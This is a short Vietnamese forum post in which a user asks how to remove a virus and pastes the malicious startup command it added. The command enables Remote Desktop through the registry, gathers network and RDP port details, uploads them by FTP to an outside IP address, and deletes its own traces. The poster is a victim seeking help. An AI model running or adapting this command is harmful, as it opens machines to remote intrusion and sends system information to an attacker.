				<title>Hướng dẫn mình cách diệt con virus này nhé các pro</title>
				<description><![CDATA[ Máy tính e đang nhiễm con này. Nó đã tự thêm 1 Key khi khởi động máy tính. Các pro giúp e diệt con này nhé. Nội dung key đó như sau:
cmd /c &quot;ipconfig &gt;&gt; 3389.txt
REG ADD HKLM\SYSTEM\CurrentControlSet\Contronl\Term&quot; &quot;Server /v
fDenyTSConnections /t REG_DWORLD /d 00000000 /f&gt;&gt;3389.txt
REG query HKLM\SYSTEM\CurrentControlSet\Contronl\Term&quot;
&quot;Server\WinStations\RDp-Tcp /v PortNumber &gt;&gt;3389.txt
echo open 122.226.56.20&gt;cmd.txt
echo 123&gt;&gt;cmd.txt
echo 123&gt;&gt;cmd.txt
echo binary&gt;&gt;cmd.txt
echo put 3389.txt%random%~%random%~%random%~%random%.txt&gt;&gt; cmd.txt
echo bye bye&gt;&gt;cmd.txt
ftp -s:cmd.txt
del 3389.txt
del cmd.txt
del %0
exit

các pro giúp mình nhé. Cám ơn nhiều.]]></description>
